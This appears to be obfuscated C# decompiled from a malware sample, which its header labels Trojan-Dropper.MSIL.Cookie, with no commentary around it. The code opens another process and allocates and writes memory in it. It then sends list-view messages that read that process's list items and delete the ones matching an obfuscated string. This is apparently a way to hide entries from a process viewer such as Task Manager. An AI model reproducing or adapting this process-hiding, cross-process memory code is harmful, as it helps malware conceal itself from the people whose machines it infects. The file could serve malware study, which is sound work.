// Decompiled with JetBrains decompiler
// Type: .
// Assembly: x1x1x1x1x1x1x1x1x, Version=2.1.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 41668E8C-580E-4768-8756-53F1BC9ECCC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Dropper.MSIL.Cookie.e-e73a14fc8e256d29203c913eab14be6d27a7cfbe002ae112a4b3e56f2707759e.exe

using \u0001;
using \u0005;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0003
  {
    private static IntPtr \u0001;
    private static string \u0001 = \u0004.\u0003(5600);
    private static string \u0002 = \u0004.\u0003(5721);
    private static string \u0003 = \u0004.\u0003(6003);
    private static string \u0004 = \u0004.\u0003(6185);
    private static string \u0005 = \u0004.\u0003(5600);
    private static string \u0006 = \u0004.\u0003(6615);

    [DllImport("kernel32", EntryPoint = "OpenProcess", SetLastError = true)]
    public static extern \u0003.\u0002 \u0003([In] uint obj0, [In] bool obj1, [In] int obj2);

    [DllImport("kernel32", EntryPoint = "ReadProcessMemory", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool \u0003(
      [In] \u0003.\u0002 obj0,
      [In] IntPtr obj1,
      [In] StringBuilder obj2,
      [In] int obj3,
      [In] ref int obj4);

    [DllImport("kernel32", EntryPoint = "ReadProcessMemory", SetLastError = true)]
    public static extern bool \u0003(
      [In] \u0003.\u0002 obj0,
      [In] IntPtr obj1,
      [In] ref \u0003.\u0001 obj2,
      [In] int obj3,
      [In] ref int obj4);

    [DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
    public static extern int \u0003([In] IntPtr obj0, [In] uint obj1, [In] IntPtr obj2, [In] IntPtr obj3);

    [DllImport("user32", EntryPoint = "SendMessage", SetLastError = true)]
    public static extern int \u0003([In] IntPtr obj0, [In] uint obj1, [In] int obj2, [In] IntPtr obj3);

    [DllImport("kernel32", EntryPoint = "VirtualAllocEx", SetLastError = true)]
    public static extern IntPtr \u0003(
      [In] \u0003.\u0002 obj0,
      [In] IntPtr obj1,
      [In] int obj2,
      [In] uint obj3,
      [In] uint obj4);

    [DllImport("kernel32", EntryPoint = "VirtualFreeEx", SetLastError = true)]
    public static extern bool \u0003([In] \u0003.\u0002 obj0, [In] IntPtr obj1, [In] int obj2, [In] uint obj3);

    [DllImport("kernel32", EntryPoint = "WriteProcessMemory", SetLastError = true)]
    public static extern bool \u0004(
      [In] \u0003.\u0002 obj0,
      [In] IntPtr obj1,
      [In] ref \u0003.\u0001 obj2,
      [In] int obj3,
      [In] ref int obj4);

    public static bool \u0003([In] IntPtr obj0, [In] IntPtr obj1)
    {
      \u0003.\u0001 = obj1;
      int num1 = -1;
      bool flag;
      try
      {
        Process[] processArray = \u0001\u0005.\u0013\u0008(\u0004.\u0003(7318));
        int index = 0;
        while (index < processArray.Length)
        {
          Process process = processArray[index];
          if (\u0017\u0003.\u0099(\u0019\u0005.\u007E\u0010\u0008((object) process), \u0004.\u0003(29054), false) == 0)
            num1 = \u0099\u0004.\u007E\u000F\u0008((object) process);
          checked { ++index; }
        }
        if (num1 == -1)
          throw new ArgumentException(\u0004.\u0003(29122), \u0004.\u0003(29171));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0086\u0004.\u009E();
        goto label_22;
      }
      \u0003.\u0002 obj = (\u0003.\u0002) null;
      try
      {
        obj = \u0003.\u0003(56U, false, num1);
        if (obj == null && \u008E\u0002.\u001F\u0005() == 0)
          throw new Win32Exception();
        int num2 = checked (\u0003.\u0003(\u0003.\u0001, 4100U, IntPtr.Zero, IntPtr.Zero) - 1);
        int num3 = 0;
        while (num3 <= num2)
        {
          ListViewItem listViewItem = new ListViewItem(\u0003.\u0003(num3, 0, obj));
          if (\u0095\u0002.\u007E\u0014\u0003((object) \u0019\u0005.\u007E\u000E\u0007((object) listViewItem), \u0002.\u0001))
            \u0003.\u0003(\u0003.\u0001, 4104U, num3, IntPtr.Zero);
          checked { ++num3; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        \u0086\u0004.\u009E();
        goto label_22;
      }
      finally
      {
        if (obj != null)
        {
          \u001E\u0004.\u007E\u0083\u0004((object) obj);
          \u001E\u0004.\u007E\u0084\u0004((object) obj);
        }
      }
      return true;
label_22:
      return flag;
    }

    private static string \u0003([In] int obj0, [In] int obj1, [In] \u0003.\u0002 obj2)
    {
      \u0003.\u0001 obj3 = new \u0003.\u0001();
      obj3.\u0003 = 260;
      obj3.\u0001 = 1U;
      obj3.\u0001 = obj0;
      obj3.\u0002 = obj1;
      StringBuilder stringBuilder1 = new StringBuilder(260);
      IntPtr num1;
      try
      {
        num1 = \u0003.\u0003(obj2, IntPtr.Zero, 260, 4096U, 4U);
        obj3.\u0001 = num1;
        IntPtr num2;
        try
        {
          num2 = \u0003.\u0003(obj2, IntPtr.Zero, obj3.\u0003(), 4096U, 4U);
          \u0003.\u0002 obj4 = obj2;
          IntPtr num3 = num2;
          ref \u0003.\u0001 local1 = ref obj3;
          int num4 = obj3.\u0003();
          int num5 = 0;
          ref int local2 = ref num5;
          if (!\u0003.\u0004(obj4, num3, ref local1, num4, ref local2))
            throw new Win32Exception();
          \u0003.\u0003(\u0003.\u0001, 4141U, obj0, num2);
          \u0003.\u0002 obj5 = obj2;
          IntPtr num6 = num1;
          StringBuilder stringBuilder2 = stringBuilder1;
          num5 = 0;
          ref int local3 = ref num5;
          if (!\u0003.\u0003(obj5, num6, stringBuilder2, 260, ref local3))
            throw new Win32Exception();
          \u0003.\u0002 obj6 = obj2;
          IntPtr num7 = num2;
          ref \u0003.\u0001 local4 = ref obj3;
          int num8 = \u0099\u0004.\u001B\u0005((object) obj3);
          num5 = 0;
          ref int local5 = ref num5;
          if (!\u0003.\u0003(obj6, num7, ref local4, num8, ref local5))
            throw new Win32Exception();
        }
        finally
        {
          if (!num2.Equals((object) IntPtr.Zero) && !\u0003.\u0003(obj2, num2, 0, 32768U))
            throw new Win32Exception();
        }
      }
      finally
      {
        if (!num1.Equals((object) IntPtr.Zero) && !\u0003.\u0003(obj2, num1, 0, 32768U))
          throw new Win32Exception();
      }
      return \u0019\u0005.\u007E\u0082\u0003((object) stringBuilder1);
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct \u0001
    {
      public uint \u0001;
      public int \u0001;
      public int \u0002;
      public uint \u0002;
      public uint \u0003;
      public IntPtr \u0001;
      public int \u0003;
      public int \u0004;
      public IntPtr \u0002;
      public int \u0005;
      public int \u0006;
      public int \u0007;
      public IntPtr \u0003;
      public IntPtr \u0004;
      public int \u0008;

      public int \u0003() => \u0099\u0004.\u001B\u0005((object) this);
    }

    internal sealed class \u0002 : SafeHandleZeroOrMinusOneIsInvalid
    {
      [DllImport("kernel32.dll", EntryPoint = "CloseHandle", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern bool \u0003([In] IntPtr obj0);

      public \u0002()
        : base(true)
      {
      }

      protected override bool ReleaseHandle() => \u0003.\u0002.\u0003(this.handle);
    }
  }
}
